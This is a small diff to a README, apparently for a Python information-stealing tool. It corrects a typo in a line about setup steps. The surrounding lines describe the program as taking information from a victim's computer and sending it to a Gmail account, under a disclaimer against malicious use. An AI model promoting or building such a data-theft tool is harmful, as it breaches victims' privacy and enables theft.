@@ -3,7 +3,7 @@ I DO NOT CONDONE ANY MAILICIOUS ACTION THAT IS USED WITH MY PROGRAM, IT IS SIMPL
 
 Snag info from a victim's computer and send it to a gmail account. (Can send it to itself)
 
-Follw these steps to get thi up and running.
+Follw these steps to get this up and running.
 
 1. You need python 3.8 (python.org) installed.
 
